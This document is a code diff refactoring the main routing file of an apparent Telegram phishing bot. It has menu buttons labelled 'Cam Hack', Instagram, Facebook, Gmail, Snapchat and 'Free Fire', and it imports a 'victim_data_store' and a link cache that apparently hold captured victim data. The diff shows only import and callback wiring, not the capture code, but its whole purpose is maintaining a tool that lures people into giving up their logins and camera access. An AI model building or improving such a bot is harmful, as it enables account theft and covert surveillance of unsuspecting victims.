@@ -4,7 +4,13 @@ import time
 import threading
 from flask import Flask
 from bot.config import BOT_TOKEN
-from bot.buttons import cam, insta, face, twit, snap, gmail, free
+from bot.buttons.cam import handle_cam_hack
+from bot.buttons.insta import handle_insta_button, handle_insta_callback
+from bot.buttons.face import handle_face_callback
+from bot.buttons.twit import handle_twit_callback
+from bot.buttons.snap import handle_snap_callback
+from bot.buttons.gmail import handle_gmail
+from bot.buttons.free import handle_free_fire
 from bot.server import app as flask_app
 from bot.utils.storage import link_cache, victim_data_store
 
@@ -52,10 +58,10 @@ def route_buttons(message):
     user_id = message.chat.id
 
     if text == "📸 Cam Hack":
-        cam.handle_cam_hack(bot, message, get_bottom_buttons)
+        handle_cam_hack(bot, message, get_bottom_buttons)
 
     elif text == "📸 Instagram":
-        insta.handle_insta_button(bot, message, get_bottom_buttons)
+        handle_insta_button(bot, message, get_bottom_buttons)
 
     elif text in ["📘 Facebook", "🐦 Twitter", "👻 Snapchat", "📧 Gmail", "🎮 Free Fire", "🔗 All Links"]:
         bot.send_message(
@@ -77,9 +83,7 @@ def handle_inline(call):
         bot.answer_callback_query(call.id, "✅ Select and copy the link manually!")
 
     elif data.startswith("ig_"):
-        insta.handle_insta_callback(bot, call)
-
-    # Add more callbacks here for other buttons
+        handle_insta_callback(bot, call)
 
 # ========== RUN BOT ==========
 def run_bot():
